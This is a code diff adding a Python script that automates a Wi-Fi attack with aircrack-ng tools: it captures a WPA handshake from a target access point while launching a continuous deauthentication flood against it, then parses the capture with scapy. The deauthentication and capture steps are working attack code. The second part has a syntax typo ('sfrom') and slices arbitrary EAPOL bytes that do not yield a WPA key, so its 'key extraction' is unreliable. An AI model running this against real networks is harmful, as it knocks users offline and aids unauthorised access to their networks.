@@ -1,0 +1,66 @@
+import subprocess
+import threading
+
+def run_command(command):
+    subprocess.run(command.split())
+
+def capture_handshake(interface, bssid, channel):
+    run_command(f"sudo airodump-ng -w folder5 -c {channel} --bssid {bssid} {interface}")
+
+def deauthenticate(bssid, interface):
+    run_command(f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}")
+
+# Display wireless network information
+run_command("iwconfig")
+
+# Kill interfering processes
+run_command("sudo airmon-ng check kill")
+
+# Ask user for interface name
+interface = input("Enter interface name: ")
+
+# Run airodump-ng on the specified interface
+run_command(f"sudo airodump-ng {interface}")
+
+# Ask user for desired BSSID
+bssid = input("Enter desired BSSID: ")
+
+# Ask user for desired channel
+channel = input("Enter desired channel: ")
+
+# Start capturing handshake in a separate thread
+capture_thread = threading.Thread(target=capture_handshake, args=(interface, bssid, channel))
+capture_thread.start()
+
+# Open a new terminal and run deauthentication command
+deauth_command = f"sudo aireplay-ng --deauth 0 -a {bssid} {interface}"
+subprocess.Popen(["gnome-terminal", "--", "bash", "-c", deauth_command])
+
+# Wait for the user to finish capturing handshake
+input("Press Enter to stop capturing handshake...")
+
+# Stop capturing thread
+capture_thread.join()
+
+# Stop monitor mode on the specified interface
+run_command(f"sudo airmon-ng stop {interface}")
+
+print("Monitor mode disabled. Exiting...")
+
+#########################
+
+sfrom scapy.all import *
+
+file_path = '/home/kali/Desktop/folder5-01.cap'
+
+def extract_wpa_key(packet):
+    if packet.haslayer(EAPOL):
+        wpa_key = packet.getlayer(EAPOL).underlayer.payload.load[95:]
+        if len(wpa_key) > 10 and len(wpa_key) < 64:
+            print("WPA Key Data (Hex):", wpa_key.hex())
+
+packets = rdpcap(file_path)
+
+for packet in packets:
+    extract_wpa_key(packet)
+
